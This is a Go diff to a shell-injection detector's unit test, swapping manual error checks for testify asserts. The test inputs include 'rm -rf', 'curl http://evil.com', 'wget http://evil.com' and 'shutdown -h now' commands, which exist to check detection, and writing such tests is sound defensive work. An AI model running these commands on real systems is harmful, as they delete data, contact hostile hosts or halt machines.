@@ -2,6 +2,8 @@ package shellinjection
 
 import (
 	"testing"
+
+	"github.com/stretchr/testify/assert"
 )
 
 func TestContainsShellSyntax(t *testing.T) {
@@ -114,28 +116,9 @@ func TestContainsShellSyntax(t *testing.T) {
 	})
 
 	t.Run("it detects basename when command has path prefix", func(t *testing.T) {
-		// Test the fix for path-prefixed command basenames bypass
-		// When userInput is just "rm" but the command is "/bin/rm -rf /tmp/x"
-		// the scanner should detect it by comparing against the basename
-		expected := true
-		result := containsShellSyntax("/bin/rm -rf /tmp/x", "rm")
-		if result != expected {
-			t.Errorf("Expected %v for 'rm' in command '/bin/rm -rf /tmp/x', but got %v", expected, result)
-		}
-
-		result = containsShellSyntax("/usr/bin/curl http://evil.com", "curl")
-		if result != expected {
-			t.Errorf("Expected %v for 'curl' in command '/usr/bin/curl http://evil.com', but got %v", expected, result)
-		}
-
-		result = containsShellSyntax("/sbin/shutdown -h now", "shutdown")
-		if result != expected {
-			t.Errorf("Expected %v for 'shutdown' in command '/sbin/shutdown -h now', but got %v", expected, result)
-		}
-
-		result = containsShellSyntax("/usr/local/bin/wget http://evil.com", "wget")
-		if result != expected {
-			t.Errorf("Expected %v for 'wget' in command '/usr/local/bin/wget http://evil.com', but got %v", expected, result)
-		}
+		assert.True(t, containsShellSyntax("/bin/rm -rf /tmp/x", "rm"))
+		assert.True(t, containsShellSyntax("/usr/bin/curl http://evil.com", "curl"))
+		assert.True(t, containsShellSyntax("/sbin/shutdown -h now", "shutdown"))
+		assert.True(t, containsShellSyntax("/usr/local/bin/wget http://evil.com", "wget"))
 	})
 }
